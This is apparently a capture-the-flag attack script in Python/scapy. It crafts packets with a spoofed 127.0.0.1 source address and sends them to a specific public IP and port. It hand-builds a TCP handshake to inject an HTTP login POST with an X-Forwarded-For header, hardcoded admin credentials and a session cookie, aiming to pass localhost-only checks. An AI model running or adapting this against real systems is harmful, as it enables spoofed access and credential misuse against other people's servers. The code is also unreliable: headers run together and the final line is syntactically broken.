from scapy.all import *



src = '127.0.0.1' # spoofed source IP address
dest = '47.97.221.96' # destination IP address
C = 36700 # source port
dport = 23333 # destination port
payload = "POST /index.php?action=login HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1Host: 47.97.221.96:23333\r\nConnection: keep-alive\r\nContent-Length: 43\r\nCache-Control: max-age=0\r\nOrigin: http://47.97.221.96:23333\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nReferer: http://47.97.221.96:23333/index.php?action=login\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: PHPSESSID=rn983sofnee1iughsrsd4bcul7\r\n\r\nusername=admin&password=nu1ladmin&code=vXR" # packet payload

payload2 = "POST /ctf/ip.php?msg=hello HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1Host: terjanq.cf\r\nConnection: keep-alive\r\nContent-Length: 43\r\nCache-Control: max-age=0\r\nOrigin: terjanq.cf\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nReferer: http://47.97.221.96:23333/index.php?action=login\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: PHPSESSID=rn983sofnee1iughsrsd4bcul7\r\n\r\nusername=admin&password=nu1ladmin&code=vXR" # packet payload


# spoofed_packet = IP(src=A, dst=B) / TCP(dport=D, sport=23333) / payload
# send(spoofed_packet)

# print spoofed_packet




request = IP(dst=dest, src='127.0.0.1') / UDP(dport=23333, sport=23333) / payload
send(request)



# request = IP(dst='terjanq.cf', src='155.1.2.3') / UDP(dport=80, sport=23333) / payload2
# send(request)




seq = 12345
sport = 1040
dport = 23333

ip_packet = IP(dst=dest)
syn_packet = TCP(sport=sport, dport=dport, flags='S', seq=seq)

packet = ip_packet/syn_packet
synack_response = sr1(packet)

next_seq = seq + 1
my_ack = synack_response.seq + 1

ack_packet = TCP(sport=sport, dport=dport, flags='A', seq=next_seq, ack=my_ack)

send(ip_packet/ack_packet)

payload_packet = TCP(sport=sport, dport=dport, flags='A', seq=next_seq, ack=my_ack)

sr(IP(dst=dest, src=src)/payload_packet/payload, multi=1, timeout=1)

print(IP(dst=dest, src=src)/payload_packet/payload, multi=1, timeout=1)_;